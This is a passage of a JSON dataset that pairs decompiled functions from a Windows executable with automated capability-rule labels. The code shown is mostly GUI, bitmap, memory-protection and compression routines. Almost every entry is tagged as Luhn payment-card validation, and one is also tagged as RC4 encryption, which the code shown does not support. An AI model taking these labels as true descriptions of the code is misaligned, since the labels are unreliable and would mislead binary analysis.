        "decompiled_code": "\nulong __cdecl fcn.00444b6c(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00444b64();\n    return CONCAT44(CARRY4(arg_8h, uVar1) + CARRY4(*(arg_8h + 0x14), arg_8h + uVar1), *(arg_8h + 0x14) + arg_8h + uVar1)\n    ;\n}\n",
        "token_count": 107
    },
    "00445110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445110(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint lpflOldProtect;\n    int32_t var_4h;\n    \n    var_4h = fcn.00444b6c(*arg_8h);\n    uVar4 = *(*arg_8h + 6);\n    if (-1 < uVar4 - 1) {\n        do {\n            if ((*(var_4h + 0x27) & 2) == 0) {\n                uVar2 = fcn.00445098(*(var_4h + 0x24));\n                uVar1 = *(var_4h + 0x24);\n                if ((uVar1 & 0x4000000) != 0) {\n                    uVar2 = uVar2 | 0x200;\n                }\n                iVar3 = *(var_4h + 0x10);\n                if (iVar3 == 0) {\n                    if ((uVar1 & 0x40) == 0) {\n                        if ((uVar1 & 0x80) != 0) {\n                            iVar3 = *(*arg_8h + 0x24);\n                        }\n                    }\n                    else {\n                        iVar3 = *(*arg_8h + 0x20);\n                    }\n                    if ((iVar3 != 0) &&\n                       (iVar3 = sub.kernel32.dll_VirtualProtect(*(var_4h + 8), *(var_4h + 0x10), uVar2, &lpflOldProtect)\n                       ,  iVar3 == 0)) {\n                        fcn.004054c0();\n                        return;\n                    }\n                }\n                fcn.00444aa0(0x28, 0);\n            }\n            else {\n                sub.kernel32.dll_VirtualFree_1(*(var_4h + 8), *(var_4h + 0x10), 0x4000);\n                fcn.00444ab8(0x28, 0);\n            }\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    return;\n}\n",
        "token_count": 494
    },
    "00445a88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445a88(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack28 = 0x445aa3;\n    var_4h = param_2;\n    fcn.004058ec();\n    uStack32 = 0x445b4f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x445b23;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h = &fcn.00445a88::var_8h;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040ee40(arg_8h, *0x445b60);\n    fcn.00405504();\n    sub.user32.dll_ShowWindow();\n    sub.user32.dll_SetForegroundWindow();\n    iVar2 = 1;\n    while( true ) {\n        iVar1 = fcn.0040572c();\n        if (iVar1 < iVar2) break;\n        fcn.004459d4();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = arg_8h;\n    iStack48 = 0x445b56;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 415
    },
    "00445ec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445ec8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x445edd;\n    fcn.00406fb0();\n    uStack24 = 0x445f1e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uVar1 = *(in_EAX + 4);\n    puStack20 = &stack0xfffffffc;\n    sub.gdiplus.dll_GdipSaveImageToStream(uVar1, in_EDX);\n    fcn.00445f54();\n    *in_FS_OFFSET = uVar1;\n    fcn.00406f3c(0x445f25, arg_8h);\n    return;\n}\n",
        "token_count": 217
    },
    "00446004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00446004(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromScan0(in_ECX, arg_ch, 0, arg_8h, 0, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.00445f50();\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 229
    },
    "00446064": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00446064(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    int32_t var_4h;\n    \n    if (param_2 != '\\0') {\n        var_4h = param_1;\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    var_4h = 0;\n    if (param_1 != 0) {\n        uVar1 = sub.gdiplus.dll_GdipGetImageGraphicsContext(*(param_1 + 4), &var_4h);\n        *(in_EAX + 8) = uVar1;\n    }\n    fcn.0044613c();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 245
    },
    "004462cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004462cc(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_ECX;\n    arg_8h_00 = fcn.00445f30();\n    uVar1 = fcn.00446004(arg_8h_00, uVar1);\n    fcn.00446064();\n    if (arg_8h == '\\x01') {\n        fcn.004460e4();\n    }\n    else if (arg_8h == '\\x02') {\n        fcn.004460e4();\n    }\n    else if (arg_8h == '\\x03') {\n        fcn.004460e4();\n    }\n    iVar2 = fcn.00446100(in_ECX, in_EDX, 0);\n    fcn.00404640();\n    fcn.00404640();\n    *in_EAX = uVar1;\n    return iVar2 == 0;\n}\n",
        "token_count": 258
    },
    "0044637c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044637c(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x44644e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.0042018c(0);\n    fcn.00406f54();\n    fcn.00445f60(0);\n    fcn.004462cc(0);\n    fcn.004461e8();\n    fcn.0042018c(0);\n    fcn.00406f54();\n    uVar1 = 0;\n    fcn.00445ec8(0);\n    fcn.00404640();\n    *in_FS_OFFSET = uVar1;\n    fcn.00406024(0x446455);\n    return;\n}\n",
        "token_count": 245
    },
    "00446474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446474(int32_t **param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x446502;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    var_4h = param_2;\n    fcn.00404610();\n    var_8h = fcn.00404610();\n    (**(**param_1 + 0x58))();\n    fcn.0041b4ac(0, 0);\n    fcn.0044637c(&var_8h);\n    uVar1 = 0;\n    fcn.0041b4ac(0, 0);\n    (**(**param_1 + 0x54))();\n    fcn.00404640();\n    fcn.00404640();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 253
    },
    "0044768c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0044768c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = *(in_EAX + 0x28) * 2;\n    *(*(in_EAX + 0x40) + -2 + *(in_EAX + 0x48) * 2) = 0;\n    fcn.004465ac(*(in_EAX + 0x40), 0, (*(in_EAX + 0x48) + -1) * 2);\n    *(in_EAX + 0x7c) = *(*(in_EAX + 0x80) * 0xc + 0x4a2aa2);\n    *(in_EAX + 0x88) = *(*(in_EAX + 0x80) * 0xc + 0x4a2aa0);\n    *(in_EAX + 0x8c) = *(*(in_EAX + 0x80) * 0xc + 0x4a2aa4);\n    *(in_EAX + 0x78) = *(*(in_EAX + 0x80) * 0xc + 0x4a2aa6);\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x70) = 0;\n    *(in_EAX + 0x74) = 2;\n    *(in_EAX + 0x5c) = 2;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 377
    },
    "0044a190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044a190(void)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    puVar1 = in_EAX + 0x90;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x11e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0x984;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x1e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0xa78;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x13);\n    *(in_EAX + 0x490) = 1;\n    *(in_EAX + 0x16a8) = 0;\n    *(in_EAX + 0x16a4) = 0;\n    *(in_EAX + 0x16ac) = 0;\n    *(in_EAX + 0x169c) = 0;\n    return;\n}\n",
        "token_count": 323
    },
    "0044a1fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a1fc(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t iStack24;\n    \n    iVar5 = *(in_EAX + 0xb58 + param_1 * 4);\n    puVar1 = param_2 + iVar5 * 4;\n    iStack24 = param_1;\n    while (iVar7 = iStack24 * 2,  iVar7 <= *(in_EAX + 0x144c)) {\n        if ((iVar7 < *(in_EAX + 0x144c)) &&\n           ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) < *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) ||\n            ((*(param_2 + *(in_EAX + 0xb5c + iStack24 * 8) * 4) == *(param_2 + *(in_EAX + 0xb58 + iStack24 * 8) * 4) &&\n             (uVar3 = *(in_EAX + 0x1454 + *(in_EAX + 0xb5c + iStack24 * 8)), \n             puVar2 = in_EAX + 0x1454 + *(in_EAX + 0xb58 + iStack24 * 8),  uVar3 < *puVar2 || uVar3 == *puVar2)))))) {\n            iVar7 = iVar7 + 1;\n        }\n        uVar4 = *(param_2 + *(in_EAX + 0xb58 + iVar7 * 4) * 4);\n        if ((*puVar1 <= uVar4 && uVar4 != *puVar1) ||\n           ((iVar6 = *(in_EAX + 0xb58 + iVar7 * 4),  *(param_2 + iVar6 * 4) == *puVar1 &&\n            (uVar3 = *(in_EAX + 0x1454 + iVar5),  puVar2 = in_EAX + 0x1454 + iVar6,  uVar3 < *puVar2 || uVar3 == *puVar2\n            )))) break;\n        *(in_EAX + 0xb58 + iStack24 * 4) = *(in_EAX + 0xb58 + iVar7 * 4);\n        iStack24 = iVar7;\n    }\n    *(in_EAX + 0xb58 + iStack24 * 4) = iVar5;\n    return;\n}\n",
        "token_count": 629
    },
    "0044a4f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a4f0(int16_t *param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint16_t *puVar4;\n    int16_t iVar5;\n    int16_t aiStack44 [16];\n    \n    iVar5 = 0;\n    iVar2 = 1;\n    piVar3 = aiStack44;\n    do {\n        piVar3 = piVar3 + 1;\n        iVar5 = (*param_1 + iVar5) * 2;\n        *piVar3 = iVar5;\n        iVar2 = iVar2 + 1;\n        param_1 = param_1 + 1;\n    } while (iVar2 < 0x10);\n    iVar2 = 0;\n    puVar4 = in_EAX + 2;\n    if (-1 < param_2) {\n        do {\n            if (*puVar4 != 0) {\n                aiStack44[*puVar4] = aiStack44[*puVar4] + 1;\n                uVar1 = fcn.0044bdcc();\n                puVar4[-1] = uVar1;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + 2;\n        } while (iVar2 <= param_2);\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "0044cc70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044cc70(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.0044c904();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**0x4aada4)();\n    }\n    return uVar2;\n}\n",
        "token_count": 90
    },
    "0044d0e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044d0e0(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sub.SHFolder.dll_SHGetFolderPathA(0);\n    if ((uVar1 & 0x80000000) == 0) {\n        fcn.004056dc();\n    }\n    else {\n        fcn.0040546c();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0044d514": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0044d514(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int16_t iVar3;\n    \n    iVar1 = *(in_EAX + 0x3c);\n    uVar2 = fcn.00402ef0();\n    fcn.00403ae4();\n    fcn.00408460();\n    iVar3 = *(iVar1 + in_EAX + 6);\n    do {\n        fcn.00408460();\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return CONCAT44(in_EAX, uVar2);\n}\n",
        "token_count": 145
    },
    "0044db24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044db24(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0044e134": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e134(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44e1d4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = fcn.0044e014();\n    *(iVar2 + 8) = *(in_EAX + 0x18);\n    fcn.004194b8();\n    (**(*param_2 + 0x24))();\n    fcn.00406f3c();\n    cVar1 = fcn.0040f850();\n    if (cVar1 != '\\0') {\n        fcn.004194b8();\n    }\n    *(in_EAX + 0x18) = *(in_EAX + 0x18) + 1;\n    fcn.00406f80();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44e1db;\n    uStack32 = 0x44e1d3;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 318
    },
    "0044e014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044e014(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    fcn.00406f54();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 137
    },
    "0044e058": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044e058(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x14) = uVar1;\n    fcn.0040546c();\n    *(in_EAX + 0x18) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 218
    },
    "00451658": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451658(uint param_1, code *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x451673;\n    fcn.0047d7bc();\n    puStack40 = 0x45167d;\n    fcn.004714f8();\n    puStack40 = 0x451685;\n    fcn.00471354();\n    uStack44 = 0x451701;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x4516c8;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *0x4a45bc = in_EAX;\n    puStack40 = &stack0xfffffffc;\n    (*param_2)();\n    *in_FS_OFFSET = param_1;\n    return;\n}\n",
        "token_count": 293
    },
    "004517e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004517e0(void)\n\n{\n    uint uVar1;\n    \n    *0x4aaf8c = sub.user32.dll_RegisterWindowMessageA(0x451844);\n    *0x4aaf90 = sub.user32.dll_RegisterWindowMessageA(0x451854);\n    uVar1 = 1;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    uVar1 = fcn.0040ae14(uVar1);\n    *0x4a45c0 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    return;\n}\n",
        "token_count": 127
    },
    "00451a84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00451a84(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0046ea58();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 148
    },
    "004521c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004521c8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00452118();\n    (***0x4a4e88)(uVar1);\n    return;\n}\n",
        "token_count": 91
    },
    "00452214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452214(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00452118();\n    (***0x4a4e38)(uVar1);\n    return;\n}\n",
        "token_count": 78
    },
    "00452724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452724(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x45273e;\n    var_4h = param_2;\n    uStack92 = fcn.00466ca8();\n    puStack96 = 0x452744;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.00452724::nLeftRect;\n        uStack100 = 0x452759;\n        uStack100 = fcn.00466ca8();\n        iStack104 = 0x45275f;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.00452724::nLeftRect;\n        uStack116 = 0x452774;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x45277c;\n        uStack116 = fcn.00466ca8();\n        puStack120 = 0x452782;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x45287f;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.00466ca8(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.00452724::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.004181c0(&fcn.00452724::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.00452724::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.004522c0();\n        uVar2 = 0;\n        fcn.00452214(0, &fcn.00452724::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.00466ca8(hdc, 0x452886);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 942
    },
    "0045460c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045460c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004047cc(),  cVar1 != '\\0')) {\n        fcn.00456fb4();\n        fcn.0045749c();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.00458208();\n    }\n    fcn.00453db0();\n    return;\n}\n",
        "token_count": 133
    },
    "00455fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455fcc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00456db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456db0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405504();\n    return;\n}\n",
        "token_count": 234
    },
    "0045784c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0045784c(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00453db0();\n    return 0;\n}\n",
        "token_count": 63
    },
    "00457b88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.00457b88(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    iVar1 = sub.user32.dll_GetKeyState(0xa5);\n    uVar3 = 0;\n    if ((iVar1 < 0) && (iVar2 = sub.user32.dll_GetKeyboardLayout(0),  uVar3 = *0x4a4778,  iVar2 != *0x4a4774)) {\n        fcn.004579e4();\n        *0x4a4774 = iVar2;\n        uVar3 = *0x4a4778;\n    }\n    return uVar3;\n}\n",
        "token_count": 150
    },
    "00457bc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
